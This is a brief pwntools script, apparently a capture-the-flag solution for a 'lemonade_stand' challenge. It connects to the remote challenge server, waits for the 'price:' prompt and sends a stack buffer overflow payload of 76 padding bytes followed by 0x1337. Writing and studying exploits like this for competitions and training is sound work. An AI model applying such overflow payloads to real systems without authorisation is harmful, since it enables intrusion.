#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./lemonade_stand', checksec=False)

p = process(elf.path)

# Your exploit here

OFFSET = 76

p = remote("offsec.m0lecon.it", 13504)
p.recvuntil(b"price:")
payload = flat(
    b'A' * OFFSET,
    0x1337
)
p.send(payload)

p.interactive()
